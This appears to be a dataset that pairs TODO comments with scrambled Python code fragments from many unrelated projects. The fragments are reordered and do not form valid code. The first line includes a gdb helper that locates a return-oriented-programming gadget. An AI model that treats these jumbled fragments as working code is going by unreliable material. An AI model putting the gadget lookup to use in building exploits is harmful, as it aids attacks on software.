# todo: remove hardcoded ad-hoc behaviors. </s> leave = gdb.execute('disas read_file',	get_leave_ret_gadget def get_leave_ret_gadget(): to_string=True).splitlines()[-3] gadget = leave.split()[0]
# todo: do we need to skip config.add_slack variable here? </s> var_filter = (lambda v: (v[1].is_integer() if discrete_only else true) and	generate_norm_inf_objective_function discrete_only: Bool only optimize on distance between the discrete variables v[1].name != 'MindtPy_utils.objective_value' and 'MindtPy_utils.MindtPy_feas.slack_var' not in v[1].name)
raise skiptest  #todo: figure out why this randomly started failing. </s> qs = {'a': 1, 'w': 4, 'format': 'json'}	test_discussion_filter_forum def test_discussion_filter_forum(self): forum_vals = ( (1, 4),
# todo: will probably need to make this configurable at some point </s> return sqlsettings()	sql_settings @property def sql_settings(self):
pass  # todo </s> def begin_ambient_camera_rotation(self, rate=0.02):	begin_ambient_camera_rotation
return 0.5, 1 #todo make a better angle here. </s> return x, y	getangle else: if wanted_angle < lowest_angle:
raise exceptions.mpdnotimplemented  # todo </s> .. versionadded:: mpd protocol 0.19	listmounts OK
@unittest.skip('not written')  # todo: finish! </s> self.assert_shortened([value], "[b'aaaaaaaaaaaaaaaaaa...aaaaaaaaa']")	test_bytes_large "b'" + 'A' * 43688 + "..." + 'A' * 21844 + "'")
# todo: clean up </s> yield _pubsubs_gsub	pubsubs_gsub _pubsubs_gsub = _make_pubsubs(hosts, gossipsubs, pubsub_cache_size)
# todo: add test </s> if cut == x_cuts[-1]:	split_textline break else: cut_text.append((r, cut[0] + 1, obj)) elif isinstance(obj, LTAnno):
# todo: give a vanilla example </s> .. math::	f_score def f_score(predicted_states, ground_truth_states): F_score^{(n)} = \\frac {2 * Precision * Recall}
# todo figure this out </s> arch = 'x86_64-linux-gnu'	build_qt_config def build_qt_config(self): configdir = os.path.join(self.installdir, 'etc', 'xdg', 'qtchooser') try:
# urwid.text( " todotxt-machine ", align='center' ), </s> urwid.text( ('header_file', " {0} ".format(self.todo.file_path)), align='right' )	main urwid.Columns( [ urwid.Text( ('header_todo_count', " {0} Todos ".format(len(self.todo.todo_items))) ), ]), 'header') listbox = urwid.ListBox(urwid.SimpleListWalker(items))
# todo(b/141131288): enable complex-valued sorts on tpu. </s> if (onp.issubdtype(dtype, onp.complexfloating) and (	LaxTest for axis in [-1, len(shape) - 1])) def testSort(self, shape, dtype, axis): (jtu.device_under_test() == "cpu" and jax.lib.version <= (0, 1, 47)) or jtu.device_under_test() == "tpu")):
# todo: make this configurable? </s> return_to = request.path_url # we return to this url here	challenge environ['repoze.who.logger'].info('No OpenID services found for: %s ' %openid_url) return self._redirect_to_loginform(environ) trust_root = request.application_url if environ['repoze.who.logger'] is not None:
# todo commit hash </s> prefix = f"https://github.com/nix-community/nur-combined/tree/master/repos/{repo}"	index_repo pkg["_repo"] = repo position = pkg["meta"].get("position", None) if position is not None and position.startswith(repo_path): prefix_len = len(repo_path)
# todo: vip1019 </s> raise invalidtypeexception("structs are not allowed in events, or as args or return values from functions yet (see vip1019)", t)	canonicalize_type ) if isinstance(t, StructType): if not isinstance(t, BaseType): raise Exception("Cannot canonicalize non-base type: %r" % t)
# look & feel todo:turn on.. </s> cv2.imshow('img1',img1); cv2.imshow('img2',img2);	test_inpainted_input_output_spec_check ret1 = core.inpainted(img1,seg1) ret2 = core.inpainted(img2,seg2) cv2.imshow('seg1',seg1); cv2.imshow('seg2',seg2); cv2.imshow('ret1',ret1); cv2.imshow('ret2',ret2);
#todo - can we raise the error before the unit test function </s> raise missingexternaldependencyerror(\	test_simple_scatter_plot except RenderPMError, err : if str(err).startswith("Can't setFont(") : "Check the fonts needed by ReportLab if you want " "bitmaps from Bio.Graphics\n" + str(err))
# todo: groupby executor, spawn many _as_completed coroutines </s> raise notimplementederror(	as_completed loop = first(fs).executor.loop else: "as_completed on many event loops not yet supported") loop = loop or IOLoop.instance()
# todo(aron): move these client test cases to their own test class </s> self.client.login_teacher(data={"username": self.teacher_username,	teacher_cant_create_students elem = self.browser.find_element_by_css_selector('a.create-student') self.assertEquals(elem.value_of_css_property("display"), "none", "create-student is still displayed!") "password": self.teacher_password}, facility=self.facility)
self.mdbx = maestral()  # todo: create or get daemon instead? </s> self.mdbx.get_remote_dropbox_async("", callback=self.mdbx.start_sync)	load_maestral finished = SetupDialog.configureMaestral(pending_link) if finished: else: logger.info("Setup aborted. Quitting.")
# todo: fire_switch_state_change(self, channel_index, old_switch_state, switch_state, from_myself) </s> elif namespace == report:	_handle_push_notification for sensor in payload['togglex']: self._update_client_data(sensor) pass elif namespace == HUB_MODE:
# todo: refactor. </s> if version.at_least(test.sync_cx, (2, 5, 4)):	test_authenticate self.assertFalse("mike" in [u['user'] for u in users]) finally: yield self.db.command({"dropAllUsersFromDatabase": 1}) else:
#todo: unit tests </s> user = auth.user	get_all_projects_smart_folder @must_be_logged_in def get_all_projects_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
# @todo: remove this if in 0.6 </s> if isinstance(node_id, node):	ex_create_ip_group def ex_create_ip_group(self, group_name, node_id=None): node_id = node_id.id group_elm = ET.Element(
# todo: convert position ordering according to data axistags </s> self.handleeditorrightclick(self.imageindex, position5d)	_handleEditorRightClick def _handleEditorRightClick(self, position5d):
# todo: should this fail instead? </s> self.assert_vsc_received(received, [	test_str_reason tid = self.send_event(10, '???') received = self.vsc.received self.expected_event( reason='pause',
# todo(developer): uncomment and set the following variables </s> parent = client.location_path(project_id, location_id)	create_scheduler_job from google.cloud import scheduler client = scheduler.CloudSchedulerClient() job = { 'app_engine_http_target': {
# todo(sbdchd): move to queries </s> async with self.client() as client:	PR if event is None: return MergeResults.CANNOT_MERGE token = await client.get_token_for_install( installation_id=self.installation_id
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> self.fail("not yet impelemented.  add helper functions and setup method")	test_cert_happy_path @httpretty.activate def test_cert_happy_path(self): saveProto = updateSelfSignedJwtStubs() responseOptions = { noRefresh : true }
# todo: this should be done on evoked </s> stcs = dics_epochs(epochs, forward, noise_csd=none, data_csd=data_csd,	test_dics_epochs noise_csd = compute_csd(epochs, mode='multitaper', tmin=None, tmax=0.0, fmin=8, fmax=12) return_generator=True) stc = stcs.next()
irregular_dims = ['time', 't']  # todo: get irregular dims from dataset_type </s> dt_data = {}	get_data_for_type def get_data_for_type(self, dataset_type, groups, variables, geopolygon, slices=None): datasets = list(chain.from_iterable(g.datasets for g in groups)) if not geopolygon:
# todo: actually test this once i figure out how to do this in py.test </s> logging.error("interrupted by user")	download jobs.get(0xFFFF) except KeyboardInterrupt:  # pragma: no cover return 1 except requests.exceptions.ConnectionError as err:
# todo make this configurable </s> def get_prefix_color(prefix):	get_prefix_color if prefix == "&": return "lightgreen"
# todo get function data </s> pass	filter_name result.append(Instance(par.parent.parent)) else: else: result.append(scope.parent)
# todo: test with multiple responses </s> x = scaler().fit_transform(x)	test_regressors boston = load_boston() X, y = boston.data, boston.target y = Scaler().fit_transform(y) for name, Reg in regressors:
# todo task python? </s> xpath = util.get_value(conf["xpath"], _input, **kwargs)	pipe_xpathfetchpage content = unicode(request.read(), request.headers['content-type'].split('charset=')[-1]) html5 = False useAsString = False
#todo: use invalidation time </s> params: channelfull, channel to dump, mediaid of the profile photo in the db	dump_supergroup def dump_supergroup(self, supergroup_full, supergroup, photo_id): Returns -""" timestamp = round(time.time())
# todo: weather data source changed, temporarily disable, will enable it later when new data source is available. </s> self._is_temp = is_temp	CitiBikeTopology super().__init__() self._data_pipeline["trip"] = CitiBikePipeline(topology, trip_source, station_info, is_temp) def __del__(self): if self._is_temp:
# todo: instead of discarding pending jobs, maintain them </s> for njob in node.pending_jobs:	run_job _job.uid, node.ip_addr, cluster._compute.name) if node.pending_jobs: if cluster.status_callback and dispy_node: dispy_node.update_time = time.time()
#todo load this from somewhere </s> pad_target = 189	allocate_devices 0.0268245, -0.0277465, 0.258805, -0.187777, -2.3835, -1.42065] device.data[l:, q] = pad_data device.targets[l:, q] = pad_target chunking_active = self.data.chunk_size > 0
# todo: verify logic for create -- we shouldn't 'annexify' non-annexified </s> annex = annexrepo(repotop, create=true) # if got there -- must be a git repo	_open filedir = dirname(file) repotop = GitRepo.get_toppath(filedir) if not annex.file_has_content(file): lgr.info("File %s has no content -- retrieving", file)
# todo: test 2b: planilha deployed mais atualizada que total (deployed) </s> if date in cases:	get_state_data_from_db for spreadsheet in spreadsheets: date = spreadsheet.date continue report_data = reports.get(date, defaultdict(list))
# todo find out what is best used here! </s> 'preferred_dtype' : none}	get_meta_information 'is_deterministic': True, 'handles_sparse': True,
# todo(dspasovski): fix this. </s> raise skiptest	test_empty_cat def test_empty_cat(self): cat = Category.objects.create(name='Empty', slug='empty', type=amo.ADDON_WEBAPP)
asynchronous=false, # todo: (true) when jconnor fixes </s> archive=true,)	update resources=resources, weight=0, result = execution.execute_async(self, call_request) return result
# todo(lbragstad): move this test to tests/test_v3_assignment.py </s> return member_url, user_ref	_create_new_user_and_assign_role_on_project self.head(member_url, expected_status=204)
# todo: check for valid values </s> self._noteheadfill = value	_setNoteheadFill def _setNoteheadFill(self, value):
# todo: convert into a proper api </s> self._focus -= 1	Frame break except IndexError: if self._focus < 0: self._focus = len(self._layouts) - 1
# todo: check arp reply is valid </s> self.asserttrue(self.packet_outs_from_flows(arp_replies))	test_arp_for_controller 'arp_source_ip': '10.0.0.1', 'arp_target_ip': '10.0.0.254'})
# todo(solitude): remove this. </s> try:	refund_reason return redirect('account.purchases') else: paypal.refund(contribution.paykey) except PaypalError, e:
#todo: remove this transformation </s> personal_schemas = set([schema.qualified_name for schema in personal_schemas_raw])	add_schema_ownerships changed (to be the same as the schema owner). personal_schemas_raw = dbcontext.get_all_personal_schemas() schemas_and_owners = dbcontext.get_all_schemas_and_owners() for schema, owner in schemas_and_owners.items():
@unittest.skip('not written')  # todo: finish! </s> self.assert_shortened([value], "[b'aaaaaaaaaaaaaaaaaa...aaaaaaaaa']")	test_bytes_large "b'" + 'A' * 43688 + "..." + 'A' * 21844 + "'")
# todo update this code once keras > 2.0.4 is released </s> try:	from_disk weights_h5 = LoggingCallback.WEIGHTS_H5.format(log_dir=log_dir, epoch=epoch) self.labeling_ = keras.models.load_model( weights_h5, custom_objects=CUSTOM_OBJECTS,
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
# todo hmm... ok, need to document reload() </s> from my.core.common import import_from, import_file	test_orger import my.reading.polar as polar reload(polar) om = import_file(ROOT / 'orger/modules/polar.py') pv = om.PolarView() # type: ignore
# todo: move this to an integration test? </s> umbral_params = default_params()	test_evaluate_cfrag def test_evaluate_cfrag(testerchain, escrow, adjudicator_contract): creator, miner, wrong_miner, *everyone_else = testerchain.interface.w3.eth.accounts u_xcoord, u_ycoord = umbral_params.u.to_affine() u_sign = 2 + (u_ycoord % 2)
# todo: federation should provide one method to send, </s> payload = handle_create_payload(entity, content.author)	send_reply if settings.DEBUG: return url = "https://%s/receive/public" % settings.SOCIALHOME_RELAY_DOMAIN send_document(url, payload)
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
common_path=prefix,  # todo: add key? </s> action="either",	make_inline_attachments_decision if lval == rval: md = MergeDecision( conflict=False, local_diff=[ld],
# todo: make an ascii-art bar </s> ctx.fillslots("progress_hash", "%.1f%%" % (100.0 * chk))	render_row_upload self._render_common(ctx, data) (chk, ciphertext, encandpush) = data.get_progress() ctx.fillSlots("progress_ciphertext", "%.1f%%" % (100.0 * ciphertext)) ctx.fillSlots("progress_encode", "%.1f%%" % (100.0 * encandpush))
# todo: take this out later </s> if self.name == 'distribute' and not os.path.isdir(os.path.join(self.source_dir, 'setuptools')):	run_egg_info logger.indent += 2 try: rmtree(os.path.join(self.source_dir, 'distribute.egg-info'))
# todo(ytknzw): add more specific assertion with the test case. </s> study.optimize(lambda t: objective(t, false), n_trials=1)	test_plot_intermediate_values figure = plot_intermediate_values(study) assert figure.has_data() is True assert len(study.trials) == 2 figure = plot_intermediate_values(study)
# todo - update this to use content-disposition instead of file_name </s> urllib.urlopen(url)	_generate_latest url = url + ("received_count=%s" % received_count) print "Hitting %s" % url print "Generated tar from %s" % url
# todo - temporary workaround while yt bug not fixed </s> offset = int(offset)	AddSubscriptions def AddSubscriptions(oc, uid, offset=0): limit = GetLimitForOC(oc) res = ApiRequest('subscriptions', ApiGetParams(
# todo(yuriyz): change to 404 (bug 1200517) </s> self.assertequal(response.status_int, 500)	test_update_not_found response = self.patch_json('/ports/%s' % uuid, {'extra': {'a': 'b'}}, expect_errors=True) self.assertEqual(response.content_type, 'application/json') self.assertTrue(response.json['error_message'])
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_question_mark'	vi_big_n def vi_big_n(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['last_buffer_search']} vi_cmd_data['count'] = 1
# todo : documentation pending </s> if not isinstance(variables, list):	tf_variables_to_numpy def tf_variables_to_numpy(variables, sess=None): var_list = [variables] else:
# todo: check output </s> output = run_model(prob)	test_feature_set_solver_print3 prob.setup(check=False)
# todo implement </s> return {}	confirm_subscription @param r: the S3Request instance @param attr: controller attributes
# todo: handle name clashing </s> self._file_cache[name] = file_path	function else: file_path, file_hash = details['file_path'], details['file_hash'] return func(*args, **kwargs)
# todo (jack): add script to dump msmarco to ext_host:ext_port </s> pass	msmarco def msmarco(args):
# todo: configurable timeout </s> tornado.ioloop.ioloop.instance().add_timeout(time.time() + 0.1, self.iter_events)	iter_events except: print sys.exc_info(), 'exception in main wait loop'
# todo wtf is that/?? </s> ax.set(ylim=(none, 70))	plot_hr_trend plt.figure(figsize=(15,4)) ax = sns.pointplot(tss, hrs) # , markers=" ") plt.show()
# hack to support saving/loading pytorch models. todo: improve </s> if hasattr(layer, "_model") and not isinstance(layer._model, model):	to_bytes i = 0 for layer in queue: weights.append(layer.to_bytes()) elif hasattr(layer, "_mem"):
# todo make this not terrible </s> response = requests.post('http://127.0.0.1:8000/webforms/get-xml/' + session_id)	render_form except EntrySession.DoesNotExist: session = None json_response = json.loads(response.text) xmlns = json_response["xmlns"]
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_mean1 def test_mean1(self): df = pd.DataFrame({'A': np.arange(n)+1.0, 'B': np.arange(n)+1}) return df.mean()
# todo: add for all fields </s> for row in rows:	csv_import systems_skipped_counter = 0
# todo email submitter </s> pass	notify_accepted def notify_accepted(self, event):
# todo: prune_services=false in future release </s> prune_services=none,	_present prune_port_fwd=False, services=None, interfaces=None, prune_interfaces=False,
# todo: handle non-normalizable combining chars. probably need to use </s> text = unicodedata.normalize('nfc', text)[0]	render_char def render_char(text, size_in_pts, bold=False, italic=False): key = 'regular' if bold:
# todo in python 2.7 and later, this should be </s> attributes = dict((column, getattr(instance, column))	DefaultSerializer foreign_key_columns = foreign_keys(model) columns = (c for c in columns if c not in foreign_key_columns) for column in columns)
# todo: consider tag.blend_clipping_elements. </s> compositor = compositor(	_apply_clip_layers def _apply_clip_layers(self, layer, color, alpha): self._viewport, color,
# todo: review </s> self.setinitial(stringcase.camelcase(key), value)	__init__ self.setinitial("type", type) for key, value in options.items(): super().__init__(descriptor)
# todo: remove at some point </s> return serie.errors.messages	validate serie.validate(config)
# todo: remove this log </s> print("{} is not a bone".format(blender_object))	__gather_node if isinstance(blender_bone, bpy.types.PoseBone): return gltf2_blender_gather_joints.gather_joint(blender_bone, export_settings) return gltf2_blender_gather_nodes.gather_node(blender_object, export_settings)
# todo: ideally we'd know whether this was a folder </s> retfiles.append(make_entry(name, path, isdir=false))	_get_dirsandfiles folder, name = os.path.split(path) if folder == base: return retdirs, retfiles
# todo: #154 - some auto-updater logic? </s> try:	from_bytes payload = ursula_as_bytes if version > cls.LEARNER_VERSION: canonical_address, _ = BytestringSplitter(PUBLIC_ADDRESS_LENGTH)(payload, return_remainder=True) checksum_address = to_checksum_address(canonical_address)
# todo alert? </s> raise runtimeerror("add volttron_agent group failed - prevent "	add_agent_user_group response[0])) if response[1]:
if lang is none:  # todo: remove in v8 </s> utils.logger.warn("renderauthors.slugify_author_name() called without language!")	slugify_author_name def slugify_author_name(self, name, lang=None): lang = '' if self.site.config['SLUG_AUTHOR_PATH']:
# todo error on missing levels </s> pass	determine_attributes dashes = dict(zip(style_levels, self.default_dashes)) elif isinstance(dashes, dict): else: dashes = dict(zip(style_levels, dashes))
# todo: include regression tests for when tvtk is installed </s> os.chdir(curdir)	test_meshwarpmaths if m.no_tvtk(): yield assert_raises, ImportError, m.MeshWarpMaths rmtree(tempdir)
# todo: should modify to parallel execution. </s> res_shares = [operator.mul(a, b) for a, b in zip(x.child, y.child)]	mul_master p_kwargs={"a_shape": shape_x, "b_shape": shape_y}, ) return res_shares  # type: ignore
raise mpdnotimplemented # todo </s> def _commands(self):	_commands @register(r'^commands$')
# todo: add cn to domains? </s> domains = crypto_util.get_sans_from_csr(csr.data, openssl.crypto.filetype_asn1)	obtain_certificate_from_csr :rtype: tuple csr = le_util.CSR(file=self.config.csr[0], data=self.config.csr[1], form="der") for d in domains: domain_callback(self.config, d)
w, h = tiledsurface.n, tiledsurface.n # todo: support for other sizes </s> thumbnail_pixbuf = self.doc.model.save(filename, feedback_cb=self.gtk_main_tick, **options)	save_file x, y, w, h =  self.doc.model.get_bbox() if w == 0 and h == 0: except document.SaveLoadError, e: self.app.message_dialog(str(e),type=gtk.MESSAGE_ERROR)
# todo: since these a delete request, shouldn't use request body. put pointer </s> pointer_id = request.json.get('pointerid')	remove_pointer auth = kwargs['auth'] node = kwargs['node'] or kwargs['project'] if pointer_id is None: raise HTTPError(http.BAD_REQUEST)
# todo: old requirement, remove in future versions? </s> self.signin()	TestPrivacyWebPublic res = self.app.get(url, follow_redirects=True) dom = BeautifulSoup(res.data) res = self.app.get(url, follow_redirects=True) dom = BeautifulSoup(res.data)
# todo replace with to_bytes() when available in utils.py </s> if isinstance(password, six.text_type):	password_encrypt :return: IV and cipher text :rtype: str password = password.encode('utf8') if isinstance(text, six.text_type):
# todo: retrieve old days count </s> 'days': days,	Defcon 'name': 'defcon', 'data': { 'enabled': enabled, }
# todo: if "pkg" in facts["inspections"] then use pkgcopier. </s> if "relative_path" in facts:	generate_pkg_recipe keys["Input"]["BUNDLE_ID"] = facts["bundle_id"] if facts["download_format"] in SUPPORTED_IMAGE_FORMATS: recipe.append_processor({ "Processor": "AppPkgCreator",
args.get('thread_config'),  # todo deprecate </s> args.get('result_format'),	run_from_cli args.get('timestamp'), args.get('services'), args.get('skipped_services'), args.get('database_name'), args.get('host_ip'),
>>> from torch import nn  # todo: import nn for all doctests </s> >>> from typing import list	register_module_fixer You may supply your own validator_class that holds the registry of FIXERS. The signature of every fixer is always the same: >>> @register_module_fixer(nn.Linear)  # TODO: change nn.Linear to MyCustomModule mock ... def fix(module: nn.Module, **kwargs) -> nn.Module:
#todo - reconsider this </s> def _clear_tree(self):	_clear_tree for child_id in self.tree.get_children(): self.tree.delete(child_id)
# todo: check if valid cdxj here before returning </s> return file_contents	fetch_remote_index_file_contents file_contents = util.fetch_remote_file(path)
# todo: break out into separate view / template </s> 'node_forks' : [	_view_project 'node_forked_date' : node_to_use.forked_date.strftime('%Y/%m/%d %I:%M %p') if node_to_use.is_fork else '', 'node_fork_count' : len(node_to_use.fork_list), { 'fork_id' : fork._primary_key,
# todo: figure out way to paramaterize node['osds'] for this test </s> for osd in node["osds"]:	test_osd_services_are_running def test_osd_services_are_running(self, node, host): assert host.service("ceph-osd@%s" % osd).is_running
# todo: non-json response contents </s> content_spec = response_spec['schema']	unmarshal_response if not has_content(response_spec): return response.status_code, None content_value = response.json() return response.status_code,\
# todo: flag to expressionreplacementvisitor to only replace </s> for obj in list(instance.component_data_objects(objective,	_replace_parameters_in_constraints remove_named_expressions=True, ) active=True, descend_into=True)):
## \todo there should really be a method to map from plug to parameter. </s> parameter = plug.node().parameterhandler().parameter()	__plugDescription def __plugDescription( plug ) : for name in plug.relativeName( plug.node() ).split( "." )[1:] : if not isinstance( parameter, IECore.CompoundParameter ) :
# todo: should use input_axes here, but the workflow always gives out </s> opreordercompare.axisorder.setvalue('txyzc')	_test_tracking_with_learning opReorderCompare = OpReorderAxes(parent=opReaderCompare) opReorderCompare.Input.connect(opReaderCompare.Output) compare = opReorderCompare.Output[:].wait() assert numpy.array_equal(result, compare)
#todo: check for continous or discrete, only continuous supported right now </s> dico = 'c'	modred ======= rsys : a reduced order model D,V = np.linalg.eig(sys.A)
# todo: this is wrong. they must be motions. </s> return vi_cmd_data	vi_g_tilde_g_tilde vi_cmd_data['post_action'] = ['collapse_to_a',]
for node in pynode.gltf.scene.nodes.values(): # todo if parent is in another scene </s> if node.index == parent:	set_transforms obj.matrix_world =  pynode.transform return if node.is_joint == True: obj.matrix_world = pynode.transform
# todo: create a queue for all orders and make it auto-complete when all the orders are processed </s> test_collector.collect(n_episode=10)	_main test_collector = Collector(policy, envs) policy.eval()
# todo: drop me after the domain-allocation switch, as this method </s> return tuple(j + i + k for i, (j, k) in zip(self.shape_with_halo, self._padding))	shape_allocated It includes the domain and halo regions, as well as any additional padding outside of the halo.
# xxx/todo: remove this when sdk 1.4.3 is released </s> if key == 'prospective_search_path':	run if isinstance(connection, DatabaseWrapper): for key, path in get_datastore_paths(connection.settings_dict).items(): continue arg = '--' + key
# todo(dcramer): we're selecting source twice which is a waste of resources </s> results = db.session.query(	get_latest_builds Build.date_created.desc(), ).limit(1).subquery() Project.id, aliased(Build, build_subquery),
# todo: we need a better way to create model instances and stay compatible with </s> state = instance_state(model)	build_new_instance when the model has a custom __init__ method. model = self._manager.new_instance() self._manager.dispatch.init(state, [], {}) return model
self.end(266) #todo# too long? </s> self.coverage()	test_5035_notify_service_functions_user self.rm_testdir()
# todo: kill this </s> inspection = inspection[0]	domain_doesnt_support_https if not inspection: return False https = inspection.get("endpoints").get("https") httpswww = inspection.get("endpoints").get("httpswww")
# todo: rewrite tests </s> pass	test_resend_form @mock.patch('framework.auth.views.send_confirm_email') def test_resend_form(self, send_confirm_email):
# todo: update cache </s> pass	unregister_app_service This removes all AS specific regex and the base URL. The token is the only thing preserved for future registration attempts.
# todo(samueldmq): change the below to get_head_action for </s> get_action='list_grants',	append_v3_routers path='/OS-INHERIT/domains/{domain_id}/groups/{group_id}/roles/' 'inherited_to_projects', rel=build_os_inherit_relation( resource_name='domain_group_roles_inherited_to_projects'),
# todo: raise warning if computed output is already in cache. </s> if hasattr(step, 'predict'):	_compute_step @staticmethod def _compute_step(Xs, cache, step): output_data = step.predict(*Xs) elif hasattr(step, 'transform'):
# todo replace all that with ssh-copy-id </s> server.append("mkdir -p ~/.ssh")	installKeys hostname = hostname.split('/')[0] server = utils.ScriptRunner(hostname) server.append("chmod 500 ~/.ssh") server.append("grep '%s' ~/.ssh/authorized_keys > /dev/null 2>&1 || echo %s >> ~/.ssh/authorized_keys"%(sshkeydata, sshkeydata))
# todo: make legacy detection non-reliant on side </s> if master_namespace not in original:	rewrite_config with open(self.filepath, 'r') as config: original = yaml.safe_load(config) original = {MASTER_NAMESPACE: original} else:
# todo: estimate fees </s> self.send(output_arr, (to_address, total_amount))	sweep output_arr.append((utxo['tx_hash'], utxo['output_n'], utxo['key_id'], utxo['value'])) total_amount += utxo['value']
# todo: exit codes are currently ignored on windows. </s> ip.system_raw(cmd)	test_1 cmd = u'''python -c "'åäö'"   '''
# todo: use value_op for this type of retrieval instead </s> gm = layer.gmean.value.get(none)	test_batchnorm_fprop gmean_ref = xmean.ravel() * (1.0 - rho) + gmean_ref * rho gvar_ref = xvar.ravel() * (1.0 - rho) + gvar_ref * rho gv = layer.gvar.value.get(None) assert ng.testing.allclose(out,
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo: exact match. </s> raise keyerror(key)	_find return elif page.is_leaf(): else: if entry_number == 0:
limit = 20  # todo: change to setting </s> opts = '\n'.join('%s. opt' % x for x in range(limit + 1))	test_markdown_poll_choice_limit_exceeded def test_markdown_poll_choice_limit_exceeded(self): Should not exceed the limit comment = "[poll name=foo]\n" + opts + "\n[/poll]" md = Markdown(escape=True, hard_wrap=True)
# todo add installation logic for torch </s> packages.append(key + '==' + version)	create_experiment if (key == 'tensorflow' or key == 'tf-nightly'): key = key + '-gpu' return Experiment( key=key,
# todo: implement subdomains for slate tensors </s> if kinfo.subdomain_id != "otherwise":	_organize_assembly_calls indices = split_kernel.indices kinfo = split_kernel.kinfo raise NotImplementedError("Subdomains not implemented.") args = [c for i in kinfo.coefficient_map
# todo: in 0.6.0 change this to "disabled": false </s> "enabled": true,	test_server_mode "duplicate_cn": True, "engine": "rsax", "fast_io": True, "fragment": 0,
# todo: this switch between 64 and 128 is a hack for now. we should have a separate cli option for size </s> output_file = get_folder(self.output_dir) / path(filename).name	convert else: image = converter.patch_image(image, face, 64 if "128" not in self.arguments.trainer else 128) cv2.imwrite(str(output_file), image) except Exception as e:
# todo(datapipe-1509|abrar): currently we have </s> raise importerror	get_base_model try: if env_config.force_avoid_internal_packages: from yelp_conn.session import declarative_base return declarative_base()
# todo: delete from application_services_regex where id=this service </s> pass	unregister_app_service This removes all AS specific regex and the base URL. The token is the only thing preserved for future registration attempts.
# todo: fix clone issue </s> def test_model_clone(self):	test_model_clone pass
# todo(iceboy): projection. </s> await asyncio.gather(user.attach_udocs(rdocs, 'uid'),	RecordMainView async def get(self): rdocs = await record.get_multi().sort([('_id', -1)]).to_list(50) problem.attach_pdocs(rdocs, 'domain_id', 'pid')) self.render('record_main.html', rdocs=rdocs)
# todo(#362): add server authentication with thrift 0.12. </s> if ca_cert:	connect 'mechanism', host, port, auth_mechanism) if use_http_transport: raise NotSupportedError("Server authentication is not supported " + "with HTTP endpoints")
# todo : documentation pending </s> try:	load_hdf5_to_weights_in_order def load_hdf5_to_weights_in_order(f, weights, sess=None): weights_names = list(f.attrs['weights_names']) except Exception:
# todo: checking for executability is a hack; use file extension </s> if os.access(self._script_path, os.x_ok):	_executable def _executable(self, steps=False): if steps: return [os.path.abspath(self._script_path)]
# @todo this needs to be using domain fronting to defeat censorship </s> response = requests.get(endpoint)	censorship_obtain_map locally for further look-ups if required. endpoint = "https://bridges.torproject.org/moat/circumvention/map" self.censorship_map = response.json() self.log("Common", "censorship_obtain_map", self.censorship_map)
"""@todo add progressbar for multisite. ensure the other one is hidden first.""" </s> try:	test_progressbar_url_file_hidden_in_ennumerate @patch('common.ProgressBar.set') def test_progressbar_url_file_hidden_in_ennumerate(self, p): self.scanner.enumerate_plugins(self.base_url, self.scanner.plugins_base_url, hide_progressbar=True)
# todo: add classname if bound method </s> nice_function_display = '%s() (in %s)' % (function.__name__, function.__module__)	contracts_decorate for x in accepts_dict]) returns_parsed = parse_flexible_spec(returns) wrap_exceptions = True if wrap_exceptions:
# todo check behavior when not loaded </s> return playlistofflinestatus(lib.sp_playlist_get_offline_status(	offline_status @property def offline_status(self): spotify.session_instance._sp_session, self._sp_playlist))
# todo: determine actual time left. </s> time_left = 60	too_many_requests_status error_data.message is displayed in the flash message error_data.timeout determines how long until flash message disappears resp = jsonify( {'message': (ERROR_DICT[err.code]).format(time_left), 'timeout': 5}
# todo replace with more general current_expression_attribute </s> matches = current_expression_attribute_re.finditer(line)	current_expression_attribute def current_expression_attribute(cursor_offset, line): for m in matches: if (m.start(1) <= cursor_offset and m.end(1) >= cursor_offset):
# todo(slaweq): change this to neutron floating ips and turn neutron </s> mock_nova.floating_ips.list.return_value = [fake_floating_ip]	test_create_server_wait_server_error mock_nova.servers.get.return_value = build_server mock_nova.servers.list.side_effect = [[build_server], [error_server]] self.assertRaises( exc.OpenStackCloudException,
# todo: below lines are commented out to ensure that </s> return super(guidmixinqueryset, self).get(*args, **kwargs)	get self.query.add_distinct_fields('id')
ridedatafileset(item=self).publish() #todo: use a more gentle message </s> self.mark_dirty()	restore_keyword_order self.keywords.restore_keyword_order(list)
# todo: we should should distinguish sub-subflows here </s> return storagepool.retrieve(task_name, self.parent[flow_name][task_name][index])	parent_flow_result :param index: index of result if more than one subflow was run :return: result of task in parent subflow
# todo: rf to use --batch where possible instead of splitting </s> if not files:	_run_annex_command_json if args: annex_options += args file_chunks = [[]] else:
# todo(b/160795287): deprecate estimator based executor. </s> serving_source = _serving_model_path(fn_args.model_run_dir)	Do absl.logging.info('Exported eval_savedmodel to %s.', user_fn_args.eval_model_dir) serving_dest = fn_args.serving_model_dir io_utils.copy_dir(serving_source, serving_dest)
total = db.get_count(query=query)  # todo(nsatterl): possible race condition? </s> found = 0	get_resources limit = request.args.get('limit', _LIMIT, int) resources = db.get_resources(query=query, sort=sort, limit=limit) resource_details = list() if len(resources) > 0:
# todo: add 'downcast' when value parameter exists </s> return dataframe(internal)	fillna else:
# todo add validation tests </s> return errors	validateObjectPose def validateObjectPose(obj): errors = []
# todo make this cancellable with is_cancellable_behavior </s> @connection.on_connection_thread()	BehaviorComponent drive_on_charger_request = protocol.DriveOnChargerRequest() return await self.grpc_interface.DriveOnCharger(drive_on_charger_request) async def find_faces(self) -> protocol.FindFacesResponse: Turn in place and move head to look for faces
#@todo: move to utils in 0.4.10 </s> def fixurl(url):	fixurl return html_unescape(urllib.unquote(url.decode('unicode-escape'))).strip()
# todo(b/145514490): this is a bit heavy handed, there maybe caches where </s> self._cache = {}	CachingExecutor target_value = await cached_value.target_future except Exception as e: raise e type_utils.check_assignable_from(type_spec, target_value.type_signature)
